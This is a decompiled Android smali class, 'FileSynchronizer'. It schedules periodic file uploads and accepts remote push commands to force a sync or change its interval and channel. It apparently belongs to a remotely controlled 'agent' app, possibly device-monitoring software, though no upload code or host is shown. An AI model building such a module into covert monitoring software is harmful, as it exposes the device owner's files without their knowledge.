.class public Lcom/hp/vd/module/synchronizer/FileSynchronizer;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "FileSynchronizer.java"


# static fields
.field public static final ATTRIBUTE_ALLOW_UPLOAD_ON_MOBILE_INTERNET:Ljava/lang/String; = "allow_upload_on_mobile_internet"

.field public static final ATTRIBUTE_FIRST_RUN:Ljava/lang/String; = "first_run"

.field public static final ATTRIBUTE_MAX_FILE_UPLOAD_SIZE:Ljava/lang/String; = "max_file_upload_size"

.field public static final ATTRIBUTE_SKIP_CYCLE:Ljava/lang/String; = "skip_cycle"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "synchronization_interval"

.field public static final ATTRIBUTE_WAKE_AFTER_LOCK_ACQUISITION:Ljava/lang/String; = "wake_after_lock_acquisition"

.field public static final COMMAND_CHANGE_SYNCHRONIZATION_CHANNEL:Ljava/lang/String; = "fs_change_synchronization_channel"

.field public static final COMMAND_CHANGE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "fs_change_synchronization_interval"

.field public static final COMMAND_FORCE_IMMEDIATE_SYNCHRONIZATION:Ljava/lang/String; = "fs_force_immediate_synchronization"

.field public static final PARAMETER_NEW_SYNCHRONIZATION_CHANNEL:Ljava/lang/String; = "new_synchronization_channel"

.field public static final PARAMETER_NEW_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "new_synchronization_interval"

.field protected static final TAG:Ljava/lang/String; = "FileSync"


# instance fields
.field protected commandReceiver:Lcom/hp/vd/module/synchronizer/file/FcmCommandReceiver;

.field protected lastSynchronization:Ljava/lang/Long;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected synchronizationThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 68
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 87
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    .line 88
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 89
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/file/FcmCommandReceiver;

    .line 91
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public forceSynchronization()Z
    .locals 1

    const/4 v0, 0x0

    .line 269
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->lastSynchronization:Ljava/lang/Long;

    .line 270
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->start()Z

    move-result v0

    return v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 97
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "synchronizer"

    .line 99
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 100
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 101
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 102
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x7

    .line 103
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v7.0"

    .line 104
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "skip_cycle"

    const-string v2, "true"

    .line 106
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "synchronization_interval"

    const-string v2, "880"

    .line 107
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "wake_after_lock_acquisition"

    const-string v2, "20"

    .line 108
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "max_file_upload_size"

    const-string v2, "33554432"

    .line 109
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "allow_upload_on_mobile_internet"

    const-string v2, "false"

    .line 110
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "first_run"

    const-string v2, "true"

    .line 111
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/16 v1, 0x191

    .line 113
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    const/4 v1, -0x1

    .line 114
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 116
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "FileSynchronizer"

    return-object v0
.end method

.method public hasInternetConnectivity()Z
    .locals 2

    .line 314
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "connectivity"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 315
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 317
    invoke-virtual {v0}, Landroid/net/NetworkInfo;->getState()Landroid/net/NetworkInfo$State;

    move-result-object v0

    sget-object v1, Landroid/net/NetworkInfo$State;->CONNECTED:Landroid/net/NetworkInfo$State;

    if-ne v0, v1, :cond_0

    const/4 v0, 0x1

    return v0

    :cond_0
    const/4 v0, 0x0

    return v0
.end method

.method protected hasUpdateIntervalExpired(Ljava/lang/Long;I)Z
    .locals 8

    .line 369
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    const/4 v1, 0x1

    if-nez p1, :cond_0

    return v1

    .line 375
    :cond_0
    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v2

    invoke-virtual {p1}, Ljava/lang/Long;->longValue()J

    move-result-wide v4

    sub-long v6, v2, v4

    int-to-long p1, p2

    cmp-long v0, v6, p1

    if-lez v0, :cond_1

    return v1

    :cond_1
    const/4 p1, 0x0

    return p1
.end method

.method public initialize()Z
    .locals 5

    .line 124
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 131
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "FileSync"

    .line 133
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "initialize(): synchronizationInterval set to "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "synchronization_interval"

    .line 135
    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 133
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const-string v1, "FileSync"

    .line 138
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "initialize(): allowUploadOnMobileInternet = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "allow_upload_on_mobile_internet"

    .line 140
    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 138
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 144
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    const-string v2, "FileSync"

    const-string v3, "cannot initialize()"

    .line 152
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 154
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    :goto_0
    const/4 v0, 0x1

    return v0
.end method

.method public isStarted()Z
    .locals 1

    .line 300
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    .line 304
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    return v0
.end method

.method protected isSynchronizationRunning(Ljava/lang/Thread;)Z
    .locals 0

    .line 384
    iget-object p1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {p1}, Ljava/lang/Thread;->isAlive()Z

    move-result p1

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {p1}, Ljava/lang/Thread;->isInterrupted()Z

    move-result p1

    if-nez p1, :cond_0

    const/4 p1, 0x1

    return p1

    :cond_0
    const/4 p1, 0x0

    return p1
.end method

.method public persistModuleData(Lcom/hp/vd/data/ModuleData;)Z
    .locals 0

    .line 336
    invoke-virtual {p0, p1}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result p1

    return p1
.end method

.method protected skipCycle()Z
    .locals 5

    .line 345
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 348
    :try_start_0
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "skip_cycle"

    invoke-virtual {v1, v2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z

    move-result v1

    const/4 v2, 0x1

    if-ne v2, v1, :cond_1

    const-string v1, "FileSync"

    const-string v3, "Skipping sync cycle"

    const/4 v4, 0x2

    .line 349
    invoke-interface {v0, v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 351
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "skip_cycle"

    const-string v4, "false"

    invoke-virtual {v1, v3, v4}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 353
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0, v1}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "FileSync"

    const-string v3, "Error setting skip cycle to \'false\'."

    const/4 v4, 0x3

    .line 354
    invoke-interface {v0, v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    return v2

    :catch_0
    :cond_1
    const/4 v0, 0x0

    return v0
.end method

.method public start()Z
    .locals 5

    .line 180
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 182
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->isActivated()Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "FileSync"

    const-string v2, "start(): This module is currently DEactivated."

    .line 183
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v0, 0x0

    return v0

    .line 192
    :cond_0
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/file/FcmCommandReceiver;

    if-nez v1, :cond_1

    .line 194
    :try_start_0
    new-instance v1, Lcom/hp/vd/module/synchronizer/file/FcmCommandReceiver;

    iget-object v2, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v3

    invoke-direct {v1, p0, v2, v3}, Lcom/hp/vd/module/synchronizer/file/FcmCommandReceiver;-><init>(Lcom/hp/vd/module/synchronizer/FileSynchronizer;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/file/FcmCommandReceiver;

    .line 195
    new-instance v1, Landroid/content/IntentFilter;

    invoke-direct {v1}, Landroid/content/IntentFilter;-><init>()V

    const-string v2, "com.hp.vb.FCM_COMMAND_RECEIVED"

    .line 197
    invoke-virtual {v1, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 199
    iget-object v2, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/file/FcmCommandReceiver;

    invoke-virtual {v2, v3, v1}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 200
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "FileSync"

    const-string v3, "fcm: commandReceiver was registered in textsync"

    invoke-interface {v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    .line 203
    iget-object v2, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v2

    const-string v3, "FileSync"

    const-string v4, "fcm: Exception caught while registering receiver"

    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 207
    :cond_1
    :goto_0
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->skipCycle()Z

    move-result v1

    const/4 v2, 0x1

    if-ne v1, v2, :cond_2

    return v2

    .line 215
    :cond_2
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "synchronization_interval"

    invoke-virtual {v1, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    .line 217
    iget-object v3, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->lastSynchronization:Ljava/lang/Long;

    invoke-virtual {p0, v3, v1}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->hasUpdateIntervalExpired(Ljava/lang/Long;I)Z

    move-result v1

    if-nez v1, :cond_3

    return v2

    .line 232
    :cond_3
    :try_start_1
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {p0, v1}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->isSynchronizationRunning(Ljava/lang/Thread;)Z

    move-result v1

    if-eqz v1, :cond_4

    const-string v1, "FileSync"

    const-string v3, "start(): a synchronization thread is already running (and is not interrupted). Skipping cycle."

    const/4 v4, 0x2

    .line 233
    invoke-interface {v0, v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2

    .line 242
    :cond_4
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->hasInternetConnectivity()Z

    move-result v1

    if-nez v1, :cond_5

    return v2

    .line 246
    :cond_5
    new-instance v1, Lcom/hp/vd/module/synchronizer/file/SynchronizationRunnable;

    iget-object v3, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v4, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-direct {v1, p0, v3, v4, v0}, Lcom/hp/vd/module/synchronizer/file/SynchronizationRunnable;-><init>(Lcom/hp/vd/module/synchronizer/FileSynchronizer;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/context/Context;Lcom/hp/vd/agent/log/IWriter;)V

    .line 253
    new-instance v3, Ljava/lang/Thread;

    const-string v4, "FileSync-On-Start"

    invoke-direct {v3, v1, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v3, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    .line 254
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v1

    .line 257
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    const-string v3, "FileSync"

    const-string v4, "start()\'s main try-catch"

    .line 258
    invoke-interface {v0, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_1
    return v2
.end method

.method public startOnHeartbeat()Z
    .locals 3

    .line 162
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 168
    invoke-virtual {p0}, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->isActivated()Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "FileSync"

    const-string v2, "startOnHeartbeat(): This module is currently DEactivated."

    .line 169
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v0, 0x0

    return v0

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 4

    .line 276
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/file/FcmCommandReceiver;

    if-eqz v0, :cond_0

    .line 278
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/file/FcmCommandReceiver;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    const/4 v0, 0x0

    .line 279
    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->commandReceiver:Lcom/hp/vd/module/synchronizer/file/FcmCommandReceiver;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 282
    iget-object v1, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "FileSync"

    const-string v3, "fcm: Exception caught in stop()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 290
    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    if-eqz v0, :cond_1

    .line 291
    iget-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->synchronizationThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_1
    const/4 v0, 0x1

    return v0
.end method

.method public synchronizationCompleted()V
    .locals 4

    .line 309
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    const-wide/16 v2, 0x3e8

    div-long/2addr v0, v2

    invoke-static {v0, v1}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    iput-object v0, p0, Lcom/hp/vd/module/synchronizer/FileSynchronizer;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method
